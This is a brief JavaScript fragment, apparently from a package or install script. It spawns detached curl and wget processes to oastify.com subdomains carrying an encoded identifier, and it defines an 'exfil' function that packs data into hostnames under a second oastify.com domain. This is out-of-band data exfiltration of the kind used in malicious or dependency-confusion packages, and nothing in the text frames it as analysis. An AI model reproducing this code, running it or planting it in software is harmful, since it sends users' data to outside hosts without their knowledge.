...
try {
  spawn(
    `curl`,
    [
      `http://${urlSafe(id)}.curl.dj02d9sc9muknk5xc9hx84g9t0zrnhb6.oastify.com/?${id}`,
    ],
    {
      detached: true,
    }
  ...
  spawn(
    `wget`,
    [
      `http://${urlSafe(id)}.wget.dj02d9sc9muknk5xc9hx84g9t0zrnhb6.oastify.com/?${id}`,
    ],
    {
      detached: true,
    }
...
function exfil(data) {
  try {
    ...
    const args2 = [];
    args2.push(
      `${globalCounter++}${urlSafe(data)}.p.9hrvk09s6fbw90r8666b5upb82et2wql.oastify.com`
    );
...
function urlSafe(data) {
  return encodeURIComponent(String(data)).replace(/[@\/\.%]/gim, "_");
}
